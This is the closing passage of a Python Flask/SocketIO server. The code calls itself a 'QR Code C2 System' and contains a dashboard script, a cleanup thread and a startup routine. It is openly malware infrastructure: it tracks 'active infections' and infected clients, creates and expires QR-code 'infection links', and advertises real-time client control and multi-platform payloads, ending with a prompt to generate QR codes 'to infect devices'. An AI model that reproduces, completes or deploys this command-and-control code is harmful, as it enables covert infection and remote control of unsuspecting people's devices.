                document.getElementById(`${tabName}-tab`).classList.add('active');
            }
            
            // Stats updating
            async function updateStats() {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    
                    document.getElementById('total-clients').textContent = data.total_clients || 0;
                    document.getElementById('online-clients').textContent = data.online_clients || 0;
                    document.getElementById('total-commands').textContent = data.total_commands || 0;
                    document.getElementById('active-infections').textContent = data.active_infections || 0;
                    
                } catch (error) {
                    console.error('Error updating stats:', error);
                }
            }
            
            function refreshClients() {
                fetch('/api/clients')
                    .then(r => r.json())
                    .then(clients => {
                        clients.forEach(addOrUpdateClient);
                        updateStats();
                    });
            }
            
            function addActivity(message) {
                const feed = document.getElementById('activity-feed');
                const time = new Date().toLocaleTimeString();
                const entry = document.createElement('div');
                entry.style.marginBottom = '5px';
                entry.innerHTML = `[${time}] ${message}`;
                feed.prepend(entry);
                
                // Keep only last 10 entries
                while (feed.children.length > 10) {
                    feed.removeChild(feed.lastChild);
                }
            }
            
            // Utility functions
            function getCookie(name) {
                const value = `; ${document.cookie}`;
                const parts = value.split(`; ${name}=`);
                if (parts.length === 2) return parts.pop().split(';').shift();
            }
            
            // Initialize
            window.onload = function() {
                initWebSocket();
                setInterval(updateStats, 5000);
                setInterval(refreshClients, 10000);
            };
        </script>
    </body>
    </html>
    '''

# ============= CLEANUP THREAD =============

def cleanup_thread():
    """Cleanup old data"""
    while True:
        try:
            # Mark inactive clients as offline
            cutoff = time.time() - 120
            for client_id, client in list(clients.items()):
                if client.get('last_seen', 0) < cutoff and client.get('online', False):
                    clients[client_id]['online'] = False
                    socketio.emit('client_offline', {'client_id': client_id})
            
            # Clean old QR codes (older than 24 hours)
            qr_cutoff = time.time() - 86400
            for infection_id, link in list(infection_links.items()):
                if link['created'] < qr_cutoff:
                    del infection_links[infection_id]
                    qr_path = f"qr_codes/{infection_id}.png"
                    if os.path.exists(qr_path):
                        os.remove(qr_path)
            
            # Clean old sessions
            for token, expiry in list(session_tokens.items()):
                if expiry < time.time():
                    del session_tokens[token]
            
            time.sleep(60)
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
            time.sleep(60)

threading.Thread(target=cleanup_thread, daemon=True).start()

# ============= MAIN =============

def main():
    port = int(os.environ.get('PORT', 10000))
    
    print(f"[*] Starting QR Code C2 System on port {port}")
    print(f"[*] Web Interface: http://0.0.0.0:{port}")
    print(f"[*] Login Password: {ADMIN_PASSWORD}")
    print(f"[*] Features:")
    print(f"    ✓ Password-protected web panel")
    print(f"    ✓ QR code infection")
    print(f"    ✓ Real-time client control")
    print(f"    ✓ Multi-platform payloads")
    print(f"    ✓ Session management")
    print()
    print("[*] Generate QR codes from the web panel to infect devices!")
    
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)

if __name__ == '__main__':
    main()
